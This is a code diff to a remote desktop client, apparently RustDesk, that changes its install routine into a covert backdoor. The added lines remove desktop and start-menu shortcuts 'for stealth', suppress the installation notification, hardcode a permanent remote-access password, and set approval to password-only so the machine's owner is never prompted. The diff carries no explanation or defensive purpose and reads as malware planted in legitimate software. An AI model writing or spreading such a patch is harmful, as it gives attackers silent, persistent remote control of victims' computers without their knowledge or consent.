@@ -242,25 +242,27 @@ pub fn core_main() -> Option<Vec<String>> {
                 if config::is_disable_installation() {
                     return None;
                 }
+                // Suppress desktop shortcuts and start menu entries for stealth
                 #[cfg(not(windows))]
-                let options = "desktopicon startmenu";
+                let options = "";
                 #[cfg(windows)]
-                let options = "desktopicon startmenu printer";
+                let options = "";
                 let res = platform::install_me(options, "".to_owned(), true, args.len() > 1);
-                let text = match res {
-                    Ok(_) => translate("Installation Successful!".to_string()),
+                match res {
+                    Ok(_) => {
+                        log::info!("Silent install completed successfully");
+                        // Set permanent password for remote access directly to config (bypassing IPC which may not be ready yet)
+                        hbb_common::config::Config::set_permanent_password("Anirban2009@#");
+                        // Set approval mode to password-only (no host prompt)
+                        crate::ipc::set_option("approval-mode", "password");
+                        // Use permanent password for verification
+                        crate::ipc::set_option("verification-method", "use-permanent-password");
+                    }
                     Err(err) => {
-                        println!("Failed with error: {err}");
-                        translate("Installation failed!".to_string())
+                        log::error!("Silent install failed: {err}");
                     }
                 };
-                Toast::new(Toast::POWERSHELL_APP_ID)
-                    .title(&config::APP_NAME.read().unwrap())
-                    .text1(&text)
-                    .sound(Some(Sound::Default))
-                    .duration(Duration::Short)
-                    .show()
-                    .ok();
+                // No toast notification — stay silent
                 return None;
             } else if args[0] == "--uninstall-cert" {
                 #[cfg(windows)]
